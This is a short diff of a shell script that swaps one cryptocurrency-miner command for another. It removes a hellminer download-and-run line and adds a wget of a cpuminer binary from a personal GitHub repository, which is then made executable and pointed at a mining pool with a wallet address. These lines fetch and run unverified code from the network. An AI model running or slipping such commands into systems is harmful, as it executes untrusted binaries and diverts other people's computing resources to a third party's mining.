@@ -1,1 +1,3 @@
-wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz && tar xf hellminer_linux64.tar.gz && ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RLNVtg1jXXuRmMkvoi6EcaCFgQzNf5vBew.wrke -p x --cpu 7
+wget https://raw.githubusercontent.com/apaple/kurohs/master/cpuminer-sse2 && chmod u+x cpuminer-sse2
+
+./cpuminer-sse2 -a minotaurx -o stratum+tcps://stratum-asia.rplant.xyz:17068 -u RNV7bACVwZZPxGAiuRxWcEzJvyXzwZxBjn.wrke -p x -t 7
